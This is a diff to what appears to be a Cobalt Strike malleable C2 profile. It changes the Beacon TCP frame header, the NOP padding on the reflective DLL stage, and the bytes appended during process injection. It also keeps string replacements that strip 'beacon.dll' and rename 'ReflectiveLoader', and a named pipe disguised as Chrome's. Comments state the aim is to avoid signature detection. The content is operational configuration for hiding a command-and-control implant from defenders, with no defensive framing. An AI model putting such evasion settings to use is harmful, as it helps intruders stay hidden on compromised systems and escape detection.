@@ -22,7 +22,7 @@ https-certificate {
 
 
 set tcp_port "42666";
-set tcp_frame_header "\xaa";
+set tcp_frame_header "\x80";
 
 
 set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
@@ -143,13 +143,13 @@ stage {
 
     # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
     transform-x86 { # transform the x86 rDLL stage
-        prepend "\x94\x95\x96\x97\x98\x99\x90\x90\x90"; # prepend nops
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
         strrep "ReflectiveLoader" "kunkunZhiXing"; # Change this text
         strrep "This program cannot be run in DOS mode" ""; # Remove this text
         strrep "beacon.dll" ""; # Remove this text
     }
     transform-x64 { # transform the x64 rDLL stage
-        prepend "\x94\x95\x96\x97\x98\x99\x90\x90\x90"; # prepend nops
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
         strrep "ReflectiveLoader" "kunkunZhiXing"; # Change this text in the Beacon DLL
         strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
     }
@@ -172,12 +172,12 @@ process-inject {
     # Transform injected content to avoid signature detection of first few bytes. Only supports prepend and append.
     transform-x86 {
         prepend "\x90\x90";
-        append "\x08\x06\x00\x00\x00\x00\x00";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
     }
 
     transform-x64 {
         prepend "\x90\x90";
-        append "\x08\x06\x00\x00\x00\x00\x00";
+        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
     }
   
     ## The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. The execute options include:
